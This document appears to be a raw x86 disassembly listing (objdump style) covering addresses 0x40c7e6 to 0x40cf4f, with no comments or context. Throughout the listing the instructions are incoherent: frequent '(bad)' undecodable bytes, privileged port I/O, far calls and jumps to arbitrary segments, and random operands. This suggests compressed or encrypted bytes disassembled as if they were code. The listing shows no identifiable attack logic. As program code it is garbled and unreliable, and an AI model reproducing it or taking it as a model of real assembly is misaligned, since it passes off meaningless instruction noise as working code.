  40c7e6:	test   al,0x16
  40c7e8:	jg     0x40c7e2
  40c7ea:	cwde   
  40c7eb:	fmulp  st(0),st
  40c7ed:	sbb    ch,cl
  40c7ef:	cmp    eax,DWORD PTR [edi]
  40c7f1:	xchg   ebp,eax
  40c7f2:	sbb    BYTE PTR ds:0x38899b24,ah
  40c7f8:	pushf  
  40c7f9:	cmp    bh,dl
  40c7fb:	mov    ebp,0x49b0a492
  40c800:	cld    
  40c801:	fdiv   DWORD PTR [edx+edx*8]
  40c804:	xlat   BYTE PTR ds:[ebx]
  40c805:	cmp    eax,0xf9dbd035
  40c80a:	nop
  40c80b:	dec    ebp
  40c80c:	xchg   ebp,eax
  40c80d:	add    eax,0x2797398
  40c812:	or     esi,DWORD PTR [ebx]
  40c814:	loope  0x40c81b
  40c816:	arpl   WORD PTR [ecx+0x6152ed60],bp
  40c81c:	data16 fwait
  40c81e:	push   edi
  40c81f:	test   al,0x1f
  40c821:	jg     0x40c7e3
  40c823:	dec    edx
  40c824:	int    0x4
  40c826:	or     eax,0xabf66e5a
  40c82b:	add    al,0x6c
  40c82d:	out    0xa1,eax
  40c82f:	mov    edx,0xe04829f4
  40c834:	cs jmp 0xe97cb27d
  40c83a:	call   0x4761:0x39a03376
  40c841:	mov    esi,0xc440510e
  40c846:	je     0x40c8af
  40c848:	mov    eax,ds:0x5224c270
  40c84d:	add    WORD PTR [ebx+edx*1-0x342a2762],bx
  40c855:	sub    DWORD PTR [ecx+ebp*4],esi
  40c858:	aas    
  40c859:	push   edx
  40c85a:	repz repz push edx
  40c85d:	mov    BYTE PTR [edi-0x27],ch
  40c860:	pop    DWORD PTR [edi]
  40c862:	pop    eax
  40c863:	les    ebx,FWORD PTR [eax]
  40c865:	jl     0x40c868
  40c867:	cmp    al,0x67
  40c869:	fs mov esi,0xf6f237e
  40c86f:	les    ebp,FWORD PTR [edi]
  40c871:	mov    edi,0x713e67c0
  40c876:	(bad)  
  40c877:	mov    esi,0xe609c19e
  40c87c:	dec    ebp
  40c87d:	pop    es
  40c87e:	out    0x2f,eax
  40c880:	sahf   
  40c881:	mov    ebp,0x17706e42
  40c886:	(bad)  
  40c888:	jb     0x40c8cd
  40c88a:	sti    
  40c88b:	pop    esi
  40c88c:	data16 in al,0xcc
  40c88f:	dec    ecx
  40c890:	push   esi
  40c891:	mov    eax,ds:0xa0a0c2cd
  40c896:	push   esi
  40c897:	loopne 0x40c819
  40c899:	sbb    eax,0x8c69889
  40c89e:	in     eax,dx
  40c89f:	pop    esi
  40c8a0:	pop    esp
  40c8a1:	xor    dl,BYTE PTR [edx+ebx*2+0x5df15762]
  40c8a8:	enter  0x3790,0x81
  40c8ac:	pop    ebx
  40c8ad:	fmul   QWORD PTR [edx]
  40c8af:	and    bl,al
  40c8b1:	in     eax,dx
  40c8b2:	lea    esp,ds:0x8edba21
  40c8b8:	jbe    0x40c843
  40c8ba:	out    dx,al
  40c8bb:	lea    ebx,[ebx]
  40c8bd:	pop    ss
  40c8be:	xor    ebp,DWORD PTR [ebx+0x3c04cf9d]
  40c8c4:	sti    
  40c8c5:	(bad)  
  40c8c8:	dec    ebp
  40c8c9:	jmp    DWORD PTR [eax]
  40c8cb:	es test eax,0x19d22eb3
  40c8d1:	dec    ecx
  40c8d2:	jg     0x40c944
  40c8d4:	sbb    esi,edx
  40c8d6:	mov    al,0xba
  40c8d8:	push   ecx
  40c8d9:	pop    edx
  40c8da:	loope  0x40c892
  40c8dc:	out    dx,al
  40c8dd:	push   0xffffffc9
  40c8df:	push   eax
  40c8e0:	sub    BYTE PTR [ecx-0xe],bl
  40c8e3:	or     bl,BYTE PTR fs:[ebp-0x42f231bf]
  40c8ea:	cmp    BYTE PTR [ebx+0x4f],0x19
  40c8ee:	cs xchg ecx,eax
  40c8f0:	jmp    0x40c8c7
  40c8f2:	push   edx
  40c8f3:	mov    dl,0x1
  40c8f5:	es repnz pop ebx
  40c8f8:	scas   eax,DWORD PTR es:[edi]
  40c8f9:	ins    BYTE PTR es:[edi],dx
  40c8fa:	pushf  
  40c8fb:	cmp    al,bl
  40c8fd:	ja     0x40c91d
  40c8ff:	arpl   WORD PTR [esi],si
  40c901:	(bad)  
  40c902:	sbb    al,0x16
  40c904:	in     eax,0x63
  40c906:	lds    esi,FWORD PTR [edx-0x78]
  40c909:	sub    eax,0xd1816985
  40c90e:	aaa    
  40c90f:	(bad)  
  40c910:	fld    TBYTE PTR [esi+eax*2-0x401894ee]
  40c917:	mov    ds:0x6ec8be8c,al
  40c91c:	mov    ebp,0x96bc5aa1
  40c921:	push   0xffffff84
  40c923:	push   es
  40c924:	imul   ecx,ebp,0x70
  40c927:	je     0x40c98e
  40c929:	mov    eax,0x339edf6d
  40c92e:	(bad)  
  40c92f:	push   ds
  40c930:	xor    BYTE PTR ds:0x3fec443,dh
  40c936:	add    al,0x1
  40c938:	push   ecx
  40c939:	mov    gs,WORD PTR [eax+edx*4-0x717c855a]
  40c940:	fs jmp 0x40c943
  40c943:	jmp    0xfe3c:0x2ec7bc73
  40c94a:	outs   dx,DWORD PTR ds:[esi]
  40c94b:	mov    ebx,DWORD PTR [esi+0x43]
  40c94e:	push   ecx
  40c94f:	xor    eax,0xf59fea83
  40c954:	add    BYTE PTR ds:0xd619fe93,ch
  40c95a:	nop
  40c95b:	mov    ds:0x66ed4b69,eax
  40c960:	inc    ebx
  40c961:	jmp    0x32f8:0x27d4efa7
  40c968:	or     eax,0xa31dee87
  40c96d:	sub    BYTE PTR [edi+0x53b92ac9],ch
  40c973:	and    BYTE PTR [edi+0x57],0x1a
  40c977:	test   al,0xbb
  40c979:	stos   BYTE PTR es:[edi],al
  40c97a:	scas   eax,DWORD PTR es:[edi]
  40c97b:	repnz in al,0x81
  40c97e:	xor    bl,BYTE PTR [esi]
  40c980:	inc    esi
  40c981:	or     DWORD PTR [ebp+0x23530158],edx
  40c987:	adc    eax,0xebac2971
  40c98c:	and    BYTE PTR [ecx+eax*8+0x425685f6],dl
  40c993:	outs   dx,DWORD PTR ds:[esi]
  40c994:	pop    edx
  40c995:	mov    bl,0x61
  40c997:	js     0x40c93f
  40c999:	or     dh,bh
  40c99b:	and    ah,0x39
  40c99e:	and    eax,edx
  40c9a0:	shl    DWORD PTR [esi+0x3e],0x3d
  40c9a4:	mov    al,0x2b
  40c9a6:	test   BYTE PTR [eax+0x3],0x11
  40c9aa:	std    
  40c9ab:	sbb    al,0x93
  40c9ad:	call   0x880c:0xae8ce7a1
  40c9b4:	mov    al,0x92
  40c9b6:	sar    DWORD PTR [eiz*1+0x29fda237],cl
  40c9bd:	ret    0x3616
  40c9c0:	and    ecx,0x65e37dcf
  40c9c6:	imul   eax,DWORD PTR [edx],0x5e34d3ac
  40c9cc:	out    dx,al
  40c9cd:	mov    al,ch
  40c9cf:	and    DWORD PTR [esi-0x76],ebp
  40c9d2:	pop    eax
  40c9d3:	out    0x50,al
  40c9d5:	lahf   
  40c9d6:	dec    edx
  40c9d7:	rol    DWORD PTR [ebx-0x2fe38f4a],cl
  40c9dd:	or     bl,BYTE PTR [ebx+0x6c]
  40c9e0:	in     eax,0x88
  40c9e2:	das    
  40c9e3:	lock dec edx
  40c9e5:	test   BYTE PTR [ebx+0x725ec0be],bl
  40c9eb:	fcmove st,st(7)
  40c9ed:	inc    ecx
  40c9ee:	adc    BYTE PTR [ecx+eiz*4+0x3f6a1e63],al
  40c9f5:	inc    eax
  40c9f6:	fld    TBYTE PTR [ebx-0x373b1cb2]
  40c9fc:	outs   dx,DWORD PTR ds:[esi]
  40c9fd:	rcr    DWORD PTR [edx-0x2a],0xb9
  40ca01:	xor    eax,0x4954727b
  40ca06:	sub    eax,0xf90bfab0
  40ca0b:	and    ebx,DWORD PTR [edi-0x6e]
  40ca0e:	ins    DWORD PTR es:[edi],dx
  40ca0f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ca10:	adc    edx,DWORD PTR [edx]
  40ca12:	add    ecx,eax
  40ca14:	pop    edi
  40ca15:	jne    0x40ca5b
  40ca17:	lds    ebx,FWORD PTR [edx]
  40ca19:	and    BYTE PTR [edi+0x7e],bh
  40ca1c:	push   edi
  40ca1d:	and    DWORD PTR [eax-0x16],edi
  40ca20:	add    al,BYTE PTR [eax-0x50]
  40ca23:	sub    BYTE PTR [ebx+eax*4],dl
  40ca26:	pop    ebx
  40ca27:	and    BYTE PTR ss:[ebp+eiz*2-0x7a],dl
  40ca2c:	das    
  40ca2d:	scas   eax,DWORD PTR es:[edi]
  40ca2e:	pop    es
  40ca2f:	ss ds jmp 0x5def71dd
  40ca36:	mov    ah,0x70
  40ca38:	cwde   
  40ca39:	test   eax,0x13b6e9ec
  40ca3e:	fld    DWORD PTR [esi-0x6d]
  40ca41:	adc    edx,edi
  40ca43:	gs pushf 
  40ca45:	mov    dl,0xe6
  40ca47:	and    edx,ebx
  40ca49:	mov    ds:0xfbba0e59,al
  40ca4e:	pop    ebx
  40ca4f:	inc    edi
  40ca50:	push   ebp
  40ca51:	xchg   esi,eax
  40ca52:	jnp    0x40ca18
  40ca54:	push   ebp
  40ca55:	ror    eax,1
  40ca57:	cwde   
  40ca58:	nop
  40ca59:	sbb    al,0xea
  40ca5b:	lahf   
  40ca5c:	std    
  40ca5d:	or     BYTE PTR [edi+0x35],cl
  40ca60:	rcl    edx,cl
  40ca62:	ss jnp 0x40ca77
  40ca65:	lea    ebx,ds:0x9d7fae9e
  40ca6b:	leave  
  40ca6c:	and    DWORD PTR [edi-0x5d713197],edx
  40ca72:	inc    eax
  40ca73:	scas   al,BYTE PTR es:[edi]
  40ca74:	xlat   BYTE PTR ds:[ebx]
  40ca75:	cmp    eax,0x311a9a06
  40ca7a:	imul   ebx,ecx,0xe90e414c
  40ca80:	inc    eax
  40ca81:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ca82:	jns    0x40ca71
  40ca84:	jae    0x40cadb
  40ca86:	push   cs
  40ca87:	mov    bl,0x5b
  40ca89:	test   BYTE PTR [ecx+0x22],cl
  40ca8c:	push   esp
  40ca8d:	in     eax,0x9c
  40ca8f:	push   0x75088ad0
  40ca94:	add    ah,ah
  40ca96:	xor    eax,0x83e2880a
  40ca9b:	das    
  40ca9c:	fsubr  st(2),st
  40ca9e:	inc    esp
  40ca9f:	into   
  40caa0:	daa    
  40caa1:	call   0x7ac7:0xbb73d6a6
  40caa8:	cld    
  40caa9:	neg    BYTE PTR [esi]
  40caab:	leave  
  40caac:	mov    esi,0xa6bb8b45
  40cab1:	aam    0x74
  40cab3:	fmul   DWORD PTR [ebp+0x31f87455]
  40cab9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40caba:	pop    edx
  40cabb:	jno    0x40cb16
  40cabd:	clc    
  40cabe:	jle    0x40ca81
  40cac0:	scas   al,BYTE PTR es:[edi]
  40cac1:	mov    ecx,0xe00e5968
  40cac6:	push   ecx
  40cac7:	and    DWORD PTR [edi],esi
  40cac9:	inc    ecx
  40caca:	or     WORD PTR [eax+0x22],sp
  40cace:	xchg   ecx,eax
  40cacf:	push   0x683765d9
  40cad4:	std    
  40cad5:	push   ecx
  40cad6:	loop   0x40cae6
  40cad8:	mov    BYTE PTR [edi],bl
  40cada:	jecxz  0x40ca70
  40cadc:	(bad)  
  40cade:	test   DWORD PTR [ebp+0x55a90c65],ebp
  40cae4:	add    eax,DWORD PTR [ebp-0x457a08b7]
  40caea:	test   eax,0x2df4f545
  40caef:	and    ebp,DWORD PTR [edx-0x5b]
  40caf2:	mov    ecx,0x32cb1823
  40caf7:	ffree  st(3)
  40caf9:	jb     0x40ca95
  40cafb:	push   0x4b
  40cafd:	add    DWORD PTR es:[eax],esp
  40cb00:	pop    edx
  40cb01:	sub    DWORD PTR [esp+esi*8],esi
  40cb04:	jo     0x40caa0
  40cb06:	fwait
  40cb07:	in     al,dx
  40cb08:	cmp    DWORD PTR gs:[esi+0x469f38de],edi
  40cb0f:	push   es
  40cb10:	or     ah,BYTE PTR [edi+0x2e]
  40cb13:	ficom  DWORD PTR [edi+ebx*8-0x2644e6d9]
  40cb1a:	rol    BYTE PTR [edx-0xec4122b],1
  40cb20:	xchg   ecx,eax
  40cb21:	mov    edx,0xa1da3d6b
  40cb26:	(bad)  
  40cb27:	adc    cl,dh
  40cb29:	mov    edx,0x3ffd4f14
  40cb2e:	sub    dh,BYTE PTR [eax]
  40cb30:	jg     0x40cb00
  40cb32:	add    edx,DWORD PTR [eax+0x4d]
  40cb35:	jmp    0x40cb85
  40cb37:	int    0x42
  40cb39:	push   es
  40cb3a:	rcl    BYTE PTR [eax-0x7],cl
  40cb3d:	or     ch,dh
  40cb3f:	xchg   esp,eax
  40cb40:	cmp    BYTE PTR [ecx],0x11
  40cb43:	mov    WORD PTR [edi-0x32],?
  40cb46:	fcmovb st,st(1)
  40cb48:	repnz or eax,0x78e073f5
  40cb4e:	dec    eax
  40cb4f:	es addr16 aam 0x43
  40cb53:	jno    0x40cbc9
  40cb55:	cmp    DWORD PTR [ebp-0x17],0xffffffa4
  40cb59:	push   eax
  40cb5a:	adc    esp,eax
  40cb5c:	jg     0x40cb1b
  40cb5e:	dec    esp
  40cb5f:	stos   BYTE PTR es:[edi],al
  40cb60:	pop    esi
  40cb61:	lahf   
  40cb62:	sar    eax,1
  40cb64:	loopne 0x40cb4a
  40cb66:	int    0xbe
  40cb68:	and    dh,BYTE PTR [esi+ebp*2-0x24]
  40cb6c:	je     0x40cb9c
  40cb6e:	jbe    0x40cb2d
  40cb70:	call   0xe033f7f0
  40cb75:	or     BYTE PTR [edi+0x73],dl
  40cb78:	push   esp
  40cb79:	leave  
  40cb7a:	fisttp WORD PTR [eax+0x20]
  40cb7d:	in     al,dx
  40cb7e:	shl    DWORD PTR [edx-0x74],cl
  40cb81:	or     BYTE PTR [ebx+ecx*4+0x40a63cd6],al
  40cb88:	cmp    eax,ebp
  40cb8a:	(bad)  
  40cb8b:	pop    ecx
  40cb8c:	and    DWORD PTR [edi+0x47],ebp
  40cb8f:	test   al,0x92
  40cb91:	das    
  40cb92:	dec    ecx
  40cb93:	sub    BYTE PTR [edx-0x36],al
  40cb96:	and    BYTE PTR [edx+0x4b],0x35
  40cb9a:	dec    esp
  40cb9b:	mov    dl,0x1b
  40cb9d:	repnz aas 
  40cb9f:	mov    ebp,0x5fd14fe2
  40cba4:	mov    al,0x2c
  40cba6:	sub    DWORD PTR [ecx],esi
  40cba8:	(bad)  
  40cba9:	or     DWORD PTR [edi],ecx
  40cbab:	clc    
  40cbac:	inc    eax
  40cbad:	sub    DWORD PTR [edx+0x26],ebx
  40cbb0:	sub    BYTE PTR [edx],cl
  40cbb2:	int3   
  40cbb3:	push   edi
  40cbb4:	mov    ds:0xc4d83c96,al
  40cbb9:	fdiv   QWORD PTR [edi]
  40cbbb:	sbb    eax,0x35af9392
  40cbc0:	xchg   edx,eax
  40cbc1:	out    0x9f,al
  40cbc3:	int3   
  40cbc4:	and    BYTE PTR es:[ebp+0x20],bh
  40cbc8:	addps  xmm4,XMMWORD PTR [ecx-0xe]
  40cbcc:	jb     0x40cc2f
  40cbce:	xor    DWORD PTR [ebx+0x651f8c57],eax
  40cbd4:	xor    BYTE PTR [edx+0x35938cc],dh
  40cbda:	inc    esi
  40cbdb:	add    ebp,DWORD PTR [ebx+0x7]
  40cbde:	mov    bh,0x41
  40cbe0:	cli    
  40cbe1:	xor    BYTE PTR [eax+0x31758257],dh
  40cbe7:	push   ss
  40cbe8:	pushf  
  40cbe9:	js     0x40cc05
  40cbeb:	daa    
  40cbec:	pop    ebp
  40cbed:	mov    dh,0x98
  40cbef:	fcmove st,st(6)
  40cbf1:	xchg   edi,eax
  40cbf2:	xchg   BYTE PTR [edi],cl
  40cbf4:	inc    ecx
  40cbf5:	add    esi,DWORD PTR [edx-0x7142809f]
  40cbfb:	lds    esp,FWORD PTR [edi-0x23]
  40cbfe:	das    
  40cbff:	jb     0x40cbcf
  40cc01:	pop    ebp
  40cc02:	jmp    0x40cb86
  40cc04:	ror    DWORD PTR [eax-0x45],0xc5
  40cc08:	ror    BYTE PTR [ebp-0x5c],cl
  40cc0b:	dec    esp
  40cc0c:	sub    eax,0xcbeac7ce
  40cc11:	loope  0x40cc48
  40cc13:	shr    BYTE PTR [esi],0x53
  40cc16:	imul   ebx,DWORD PTR [esi-0x2e],0x7f54c18e
  40cc1d:	fadd   QWORD PTR [edx]
  40cc1f:	stos   BYTE PTR es:[edi],al
  40cc20:	mov    al,ds:0x42c5aae1
  40cc25:	or     esi,DWORD PTR [ecx]
  40cc27:	pusha  
  40cc28:	loop   0x40cc01
  40cc2a:	call   0x7782:0x637f6faf
  40cc31:	out    0xfb,al
  40cc33:	sub    bh,BYTE PTR [edi-0x35d6bc0d]
  40cc39:	mov    DWORD PTR [ebp-0x5c1fab59],ecx
  40cc3f:	push   edx
  40cc40:	mov    edx,0x153f4e02
  40cc45:	dec    edi
  40cc46:	(bad)  
  40cc47:	xchg   ebx,eax
  40cc48:	adc    BYTE PTR [ebp-0x31],dh
  40cc4b:	sbb    BYTE PTR [ecx-0x18bf5671],ah
  40cc51:	stos   BYTE PTR es:[edi],al
  40cc52:	push   ecx
  40cc53:	mov    ah,0xdd
  40cc55:	pop    edi
  40cc56:	xchg   edx,eax
  40cc57:	mov    ah,BYTE PTR ds:0x296427e3
  40cc5d:	stos   BYTE PTR es:[edi],al
  40cc5e:	fidivr WORD PTR [eax]
  40cc60:	fisttp WORD PTR ds:0x9067c731
  40cc66:	adc    eax,0x305adae2
  40cc6b:	jle    0x40cca0
  40cc6d:	ret    0xf327
  40cc70:	push   eax
  40cc71:	adc    al,0xb9
  40cc73:	xchg   edx,eax
  40cc74:	outs   dx,BYTE PTR ds:[esi]
  40cc75:	nop
  40cc76:	xchg   ebp,eax
  40cc77:	test   BYTE PTR [edi-0x5],cl
  40cc7a:	adc    dl,BYTE PTR [ecx-0x34a4e705]
  40cc80:	int3   
  40cc81:	dec    ebx
  40cc82:	test   BYTE PTR ds:0xa52021e5,bh
  40cc88:	mov    cs,WORD PTR [edx-0x9]
  40cc8b:	jnp    0x40cccd
  40cc8d:	rcl    DWORD PTR [ecx+0x16cb7b0e],cl
  40cc93:	pop    ebx
  40cc94:	aad    0xb4
  40cc96:	add    al,0xfa
  40cc98:	inc    ebp
  40cc99:	daa    
  40cc9a:	arpl   WORD PTR [edx-0x20],bx
  40cc9d:	adc    bl,BYTE PTR [edi+eiz*4+0xf]
  40cca1:	jecxz  0x40cc4f
  40cca3:	jns    0x40ccbe
  40cca5:	mov    ecx,0x3abe304d
  40ccaa:	mov    esi,0xa4e1a366
  40ccaf:	(bad)  
  40ccb0:	jmp    0xd5c09d0a
  40ccb5:	xor    DWORD PTR [ebp+0x5f53e1df],0x42
  40ccbc:	mov    eax,0xf6e2da21
  40ccc1:	mov    cl,0xbd
  40ccc3:	fsubr  DWORD PTR [ecx-0x7]
  40ccc6:	ret    0xb976
  40ccc9:	sbb    eax,0x9ba1d56a
  40ccce:	mov    bh,0xf9
  40ccd0:	stos   DWORD PTR es:[edi],eax
  40ccd1:	pop    ecx
  40ccd2:	jmp    0xdc8b7b5
  40ccd7:	shl    al,1
  40ccd9:	sbb    dl,ch
  40ccdb:	or     ax,0x40fc
  40ccdf:	div    BYTE PTR [ebp+0x45230416]
  40cce5:	bound  ebp,QWORD PTR [eax]
  40cce7:	data16 ja 0x40cccd
  40ccea:	xchg   ebp,eax
  40cceb:	cmc    
  40ccec:	sbb    bh,dh
  40ccee:	and    BYTE PTR [esi+0x1e],cl
  40ccf1:	pop    es
  40ccf2:	dec    eax
  40ccf3:	inc    esi
  40ccf4:	sub    al,0x14
  40ccf6:	pop    ecx
  40ccf7:	data16 sbb ah,BYTE PTR cs:[ecx-0x5c]
  40ccfc:	and    al,0x95
  40ccfe:	sbb    DWORD PTR ds:0xf0f83f20,edi
  40cd04:	int3   
  40cd05:	cmp    BYTE PTR [eax-0x33],0x8f
  40cd09:	loope  0x40cd60
  40cd0b:	call   0x9a873be1
  40cd10:	push   ecx
  40cd11:	out    0xc7,al
  40cd13:	into   
  40cd14:	xlat   BYTE PTR ds:[ebx]
  40cd15:	(bad)  
  40cd16:	cwde   
  40cd17:	inc    edi
  40cd18:	xor    eax,0xddb76814
  40cd1d:	jbe    0x40cd12
  40cd1f:	and    BYTE PTR [edi-0x6a],dh
  40cd22:	xchg   esi,eax
  40cd23:	sbb    edi,esi
  40cd25:	fwait
  40cd26:	or     al,bl
  40cd28:	int    0x68
  40cd2a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cd2b:	scas   al,BYTE PTR es:[edi]
  40cd2c:	hlt    
  40cd2d:	adc    bh,BYTE PTR [ebx-0x6048bf4d]
  40cd33:	pop    edi
  40cd34:	loopne 0x40ccf4
  40cd36:	int    0xdc
  40cd38:	sbb    eax,0xb4af0daa
  40cd3d:	mov    eax,0x4bc825e2
  40cd42:	das    
  40cd43:	dec    ebp
  40cd44:	cmp    BYTE PTR [esi+0xe],dl
  40cd47:	frstor [edi]
  40cd49:	test   esp,ebx
  40cd4b:	shl    BYTE PTR [edi],0x16
  40cd4e:	aad    0x52
  40cd50:	cwde   
  40cd51:	leave  
  40cd52:	fdivr  QWORD PTR [ecx-0x33ff1de9]
  40cd58:	cmp    BYTE PTR [ebx+eax*1+0x34],ch
  40cd5c:	jne    0x40cd12
  40cd5e:	jmp    0x40cd88
  40cd60:	adc    ch,ah
  40cd62:	popa   
  40cd63:	xlat   BYTE PTR ds:[ebx]
  40cd64:	cmp    dh,bl
  40cd66:	cmp    esi,DWORD PTR [edi-0x60e5bab0]
  40cd6c:	or     cl,BYTE PTR fs:[edi+0x16]
  40cd70:	scas   eax,DWORD PTR es:[edi]
  40cd71:	lahf   
  40cd72:	test   DWORD PTR [edi],0x2aa65251
  40cd78:	in     eax,dx
  40cd79:	addr16 dec esi
  40cd7b:	test   eax,0x269f779f
  40cd80:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cd81:	out    0xef,al
  40cd83:	jp     0xd624e65e
  40cd89:	psubw  mm2,QWORD PTR [esi+0x43964dbd]
  40cd90:	mov    ds:0x5a74ef17,al
  40cd95:	mov    eax,0xa20a7bb0
  40cd9a:	add    al,0xa1
  40cd9c:	test   DWORD PTR [ebp+0x388699a5],ecx
  40cda2:	push   es
  40cda3:	jl     0x40cd69
  40cda5:	ror    cl,0xaf
  40cda8:	cdq    
  40cda9:	cdq    
  40cdaa:	inc    edx
  40cdab:	shl    bh,1
  40cdad:	pop    ds
  40cdae:	xchg   edi,eax
  40cdaf:	lods   eax,DWORD PTR ds:[esi]
  40cdb0:	inc    eax
  40cdb1:	xor    eax,0x1bd1113d
  40cdb6:	adc    DWORD PTR [edi-0x985b23e],0x512b2892
  40cdc0:	pop    eax
  40cdc1:	rcr    DWORD PTR [esi-0x58a9c57],cl
  40cdc7:	gs pop es
  40cdc9:	mov    ch,0x75
  40cdcb:	das    
  40cdcc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cdcd:	stos   BYTE PTR es:[edi],al
  40cdce:	mov    ds:0xdf957b67,eax
  40cdd3:	push   ds
  40cdd4:	jle    0x40ce45
  40cdd6:	push   cs
  40cdd7:	(bad)  
  40cdd8:	stos   DWORD PTR es:[edi],eax
  40cdd9:	mov    cl,BYTE PTR [edi-0x63]
  40cddc:	stos   DWORD PTR es:[edi],eax
  40cddd:	test   al,0x1
  40cddf:	fld    st(5)
  40cde1:	pop    ss
  40cde2:	imul   ebx,DWORD PTR [ebx],0x2ede7665
  40cde8:	sub    DWORD PTR ds:0x750c34bd,esi
  40cdee:	mov    edi,0x42c20638
  40cdf3:	out    0xc9,eax
  40cdf5:	jmp    0xd3c2b26a
  40cdfa:	inc    DWORD PTR [ebx+0x2]
  40cdfd:	cmp    ebx,ebp
  40cdff:	pop    edx
  40ce00:	cmp    al,bh
  40ce02:	push   edx
  40ce03:	arpl   WORD PTR [ecx+0x4ad504a0],sp
  40ce09:	jae    0x40ce63
  40ce0b:	sbb    eax,DWORD PTR [edx-0x55]
  40ce0e:	xlat   BYTE PTR ds:[ebx]
  40ce0f:	dec    esp
  40ce10:	nop
  40ce11:	(bad)  
  40ce12:	icebp  
  40ce13:	outs   dx,BYTE PTR ds:[esi]
  40ce14:	push   eax
  40ce15:	adc    eax,0x65b0e511
  40ce1a:	mov    esp,0xdfe44138
  40ce1f:	inc    ecx
  40ce20:	and    al,0xda
  40ce22:	add    edx,ebx
  40ce24:	mov    dl,0x1
  40ce26:	pop    edi
  40ce27:	dec    edx
  40ce28:	lds    edi,FWORD PTR [edx-0x7c]
  40ce2b:	arpl   WORD PTR [esp+edi*1-0x3],si
  40ce2f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ce30:	loop   0x40ce01
  40ce32:	xlat   BYTE PTR ds:[ebx]
  40ce33:	lods   eax,DWORD PTR ds:[esi]
  40ce34:	aaa    
  40ce35:	mov    ah,0x99
  40ce37:	scas   al,BYTE PTR es:[edi]
  40ce38:	fistp  DWORD PTR [edi]
  40ce3a:	xchg   BYTE PTR [edx+0x5d],ah
  40ce3d:	call   0xb498:0xae5763b0
  40ce44:	fiadd  WORD PTR [esi+0x56]
  40ce47:	cmp    al,0xde
  40ce49:	dec    edi
  40ce4a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ce4b:	sbb    dh,BYTE PTR ds:0x335d6d44
  40ce51:	pop    esi
  40ce52:	std    
  40ce53:	push   esp
  40ce54:	addr16 cld 
  40ce56:	ret    
  40ce57:	jns    0x40cdd9
  40ce59:	pop    ds
  40ce5a:	and    DWORD PTR [ecx-0x304771a3],edi
  40ce60:	pop    edi
  40ce61:	clc    
  40ce62:	and    al,0x30
  40ce64:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ce65:	or     eax,0xad17a61
  40ce6a:	fsub   DWORD PTR [eax]
  40ce6c:	or     DWORD PTR [esi-0x25],ebx
  40ce6f:	push   esp
  40ce70:	(bad)  
  40ce72:	xchg   BYTE PTR [ebx],dh
  40ce74:	cmp    eax,0x1893c829
  40ce79:	add    DWORD PTR [ebx-0x774ad878],ecx
  40ce7f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ce80:	aam    0xc0
  40ce82:	and    al,0x4a
  40ce84:	jno    0x40ce65
  40ce86:	lea    edx,[ecx+eax*4-0x60]
  40ce8a:	push   esi
  40ce8b:	cli    
  40ce8c:	outs   dx,BYTE PTR ds:[esi]
  40ce8d:	or     dh,dh
  40ce8f:	cmc    
  40ce90:	xchg   esp,eax
  40ce91:	outs   dx,BYTE PTR ds:[esi]
  40ce92:	test   cl,dl
  40ce94:	and    bh,ch
  40ce96:	mov    dh,dl
  40ce98:	das    
  40ce99:	sub    ebx,DWORD PTR [esi]
  40ce9b:	jl     0x40cf07
  40ce9d:	addr16 xchg esp,eax
  40ce9f:	inc    DWORD PTR [edx]
  40cea1:	fst    DWORD PTR [esp+eiz*8+0x61]
  40cea5:	jbe    0x40ce44
  40cea7:	jl     0x40cf16
  40cea9:	(bad)  
  40ceaa:	int3   
  40ceab:	arpl   WORD PTR [ebx-0xa6a54d],cx
  40ceb1:	fisttp QWORD PTR ds:0x5bc9d4e4
  40ceb7:	(bad)  [ebx+0x401e923f]
  40cebd:	int3   
  40cebe:	adc    dl,BYTE PTR fs:[ebx-0x6a]
  40cec2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cec3:	mov    eax,ds:0x1f9c1e0f
  40cec8:	mov    ds:0x193c0717,eax
  40cecd:	inc    ebp
  40cece:	(bad)  
  40cecf:	xchg   BYTE PTR [ebx+eiz*4-0x1f46a06b],bh
  40ced6:	sbb    esp,ebp
  40ced8:	stos   BYTE PTR es:[edi],al
  40ced9:	loopne 0x40cebe
  40cedb:	adc    cl,ah
  40cedd:	sub    al,0x29
  40cedf:	daa    
  40cee0:	call   0x87e5e8ff
  40cee5:	jnp    0x40ceb6
  40cee7:	rcr    BYTE PTR [ebp-0x5f],cl
  40ceea:	dec    ebp
  40ceeb:	ret    0xb058
  40ceee:	mov    eax,ds:0xd946a4d7
  40cef3:	inc    si
  40cef5:	push   eax
  40cef6:	push   ds
  40cef7:	ret    
  40cef8:	adc    eax,0x9b90832a
  40cefd:	push   edi
  40cefe:	mul    DWORD PTR [esi+eiz*8+0x4f]
  40cf02:	xor    cl,ch
  40cf04:	out    dx,al
  40cf05:	dec    esp
  40cf06:	add    ecx,DWORD PTR [edx-0xb]
  40cf09:	je     0x40cf6d
  40cf0b:	push   edi
  40cf0c:	ins    DWORD PTR es:[edi],dx
  40cf0d:	jge    0x40cf50
  40cf0f:	sbb    DWORD PTR [ecx+0x1a71039c],eax
  40cf15:	jecxz  0x40cf0d
  40cf17:	fst    DWORD PTR [ebp+edx*1-0x79d990e4]
  40cf1e:	es test al,0x89
  40cf21:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cf22:	hlt    
  40cf23:	lock sti 
  40cf25:	push   esp
  40cf26:	mov    ecx,0x53bdb033
  40cf2b:	pop    ebp
  40cf2c:	inc    ebx
  40cf2d:	leave  
  40cf2e:	adc    al,BYTE PTR [esi-0x41ecb6bc]
  40cf34:	test   BYTE PTR [esi-0x33db4905],0x14
  40cf3b:	adc    eax,0x285df99b
  40cf40:	mov    edi,0x2c3dcd02
  40cf45:	loope  0x40cef3
  40cf47:	mov    dl,al
  40cf49:	sbb    al,0x2d
  40cf4b:	cli    
  40cf4c:	dec    edi
  40cf4d:	cmp    al,0x15
  40cf4f:	and    DWORD PTR [esi-0x4ab797d0],esp
